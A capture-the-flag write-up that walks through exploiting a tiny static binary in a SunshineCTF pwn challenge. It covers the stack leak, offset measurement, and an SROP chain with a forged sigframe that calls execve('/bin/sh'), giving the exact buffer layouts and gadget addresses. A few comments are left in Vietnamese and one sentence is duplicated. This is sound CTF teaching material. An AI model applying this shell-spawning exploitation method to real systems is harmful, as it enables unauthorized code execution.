# Total Recall - Pwn (Medium)

`Can you recall how to get out of this one?`

SunshineCTF 2026, pwn, 497 points, author Oreomeister. File provided for download: `total_recall`.
**Remote:** `nc chal.sunshinectf.games 26003`.

## Challenge

The challenge text is exactly the one line above: no technical hint, no libc named, no reference
script. Every conclusion below is drawn from the binary itself.

## Analysis

```
Type: EXEC (no PIE), statically linked, stripped, entry 0x401000
phnum = 2: LOAD 0x400000 R (0xb0) | LOAD 0x401000 R+X (0x6c)
no PT_GNU_STACK
```

`Type: EXEC` means no PIE, so every code address is a constant and the code segment does not need
leaking. The whole program is only 108 bytes (`analysis/disasm.txt`):

```
401000  call f1
401005  call f2
40100a  mov rax,60 ; xor rdi,rdi ; syscall                          exit(0)

401016  push rsp                                                    f1: leak
        mov rsi,rsp ; mov rdi,1 ; mov rdx,8 ; mov rax,1 ; syscall   write(1, rsp, 8)
401031  pop rax
401032  lea rsi,[rsp-0x40] ; mov rdi,0 ; mov rdx,0x18 ; mov rax,0 ; syscall   read(0, rsp-0x40, 24)
40104e  ret

40104f  lea rsi,[rsp-0x80] ; mov rdi,0 ; mov rdx,0x400 ; mov rax,0 ; syscall  read(0, rsp-0x80, 1024)
40106b  ret
```

Four points drawn from those 108 bytes:

The 108-byte disassembly provides four details used by the exploit:
1. `write` uses `rsi = rsp` immediately after `push rsp`, returning a little-endian stack pointer.
2. `f2` reads up to 1024 bytes; probing places the return address at offset `0x80` from the buffer start.
3. `read` accepts `0x00`, so the input can contain a binary payload.
4. `read` returns its byte count in `rax`. Together with a `syscall; ret` gadget, this controls the syscall number for SROP.

## Approaches tried

| # | Hypothesis | Result |
|---|---|---|
| H2 | No PT_GNU_STACK so `READ_IMPLIES_EXEC`, the stack is executable, drop shellcode into the buffer and it is done | DEAD: jumping into the buffer dies silently, even after trying two ways of computing `buf` and with a 0x50-byte NOP sled covering both. The server has NX. |
| H5 | The sigframe starts with 128 bytes of `siginfo` (`sigcontext` at `frame+0xA8`) | DEAD: this layout returns 0 bytes; only the layout with `sigcontext` at `frame+0x28` returns data. |
| H7 | `buf = L - 0x78` (believing `push rsp` stores the value after the subtraction) | DEAD: corrected to `L - 0x80` using a measurement that does not depend on the semantics of `push`. |
| H8 | Data at `buf+0x300` had not reached memory yet because `read` returned short | HALF RIGHT: a genuine trap that has to be avoided, but not the main cause. |
| H9 | seccomp blocks `execve` | DEAD: `execve("/no/such/file")` returns a clear error; `execve("/bin/sh")` goes silent because it succeeds. |

## Solution

### Step 1 - Pinning down the stack geometry with pure ROP, free of assumptions

`RET_OFF = 0x80` and the fact that the `ret` of f2 leaves `rsp = buf+0x88` are confirmed by a chain
using only the program's own two gadgets (`analysis/probe_exec.py`, `analysis/walk_leak.py`).

Because every leak goes through `push rsp`, an 8-byte error in `buf` cannot be detected from the leak.
The measurement used here is `analysis/measure_rsp.py`: each cell of the frame is seeded with a
sentinel `buf+0x300+j`, the sigframe is made to jump back to `0x401000`; the restarted program then
leaks `rsp - 16`, and the number returned matches only cell `0xA0`. Working backwards, `delta` has to
be **`buf = L - 0x80`**.

There is an independent check that does not use sigreturn: the gadget `0x401032` consumes input and
pushes `rsp` up by 8 each time, so calling it `k` times and then jumping into `0x401017` leaks exactly
`buf+0x88+8k`. All five planted values match.

### Step 2 - Using `read` to load `__NR_rt_sigreturn` into `rax`

The binary already has bare `syscall; ret` at `0x40104c` and `0x401069` (jumping in after the
`mov rax,0` of the sequence below). The gadget at `0x401032` calls `read(0, rsp-0x40, 24)` and leaves
the number of bytes read in `rax`. Sending exactly 15 bytes gives `rax = 15`:

```
[buf+0x80] = 0x401032   read(0, buf+0x48, 24) -> rax = 15, ret
[buf+0x88] = 0x401069   syscall               -> rt_sigreturn, frame lấy tại [rsp] = buf+0x90
```

`rsp` at the moment of the syscall is `buf+0x90`, so the sigframe is placed right there.

### Step 3 - The sigframe

The kernel on the server reads the `ucontext` starting immediately at `rsp` (no 128 bytes of `siginfo`
in front), so `sigcontext` sits at `frame+0x28`:

```
frame+0x68 rdi    frame+0x70 rsi    frame+0x88 rdx    frame+0x90 rax = 59
frame+0xA0 rsp    frame+0xA8 rip    frame+0xB0 eflags = 0x246
frame+0xB8 cs=0x33, gs=0, fs=0, ss=0x2b               frame+0xD8 fpstate = 0
```

`rip = 0x401069`: after sigreturn restores the context, the `syscall` instruction runs again, but this
time with `rax = 59`, that is `execve(rdi, rsi, rdx)`. `rsp` points into the cell `buf+0x78` holding
`0x401000`, and that is the bait: if `execve` returns an error then the last `ret` of f2 jumps back
there and the program restarts (leaking 8 more bytes); complete silence means `execve` succeeded.

Buffer layout, everything sits within the first 512 bytes; the region `buf+0x40..0x57` is overwritten
by the two `read` calls so it is left empty:

```
0x00  argv = { &"/bin/sh", NULL }
0x20  "/bin/sh"
0x78  0x401000                        <- rsp sau sigreturn, mồi chẩn đoán
0x80  0x401032      0x88  0x401069
0x90  sigframe
```

### Step 4 - Verifying every register before firing execve

`analysis/probe_args.py` jumps into the middle of f1's `write` sequence, where
`rsi`/`rdi`/`rdx`/`rax` **can only come from the frame**:

```
0x401017 -> 8 byte    (rsi = rsp)
0x401021 -> 8 byte    (thêm rdi, rsi từ frame)
0x401028 -> 24 byte   (thêm rdx từ frame)
0x401069 -> 24 byte   (plus rax from frame)  <== full control with an arbitrary syscall
```

The whole ladder matches, so the frame is loaded in full. `analysis/probe_syscall_allow.py` then uses
that same bait mechanism to check which syscalls are allowed.

## Result
```
sun{r3caLl_ev3Ry_reGist3r_sR0p}
```

The flag lives in `/ctf/flag.txt` (32 bytes, owner `root:total_recall`, mode `-rw-r-----`);
the shell that is gained has read permission on this file.

## Reproduce

```bash
python exploit.py                              # mặc định: cat /ctf/flag.txt + ls -la /ctf /home
python exploit.py 'id' 'cat /ctf/flag.txt'     # mỗi argv một lệnh, gửi lần lượt
python analysis/probe_args.py                  # stepwise measurement of each sigframe register
python analysis/measure_rsp.py                 # đo lại delta buf = L - 0x80
```

`exploit.py` uses only the stdlib, connects to `chal.sunshinectf.games:26003` on its own and re-leaks
the base on every run; apart from the gadgets of the binary itself there is no other hardcoded
address. `analysis/disasm.txt` contains all 108 bytes of the program.
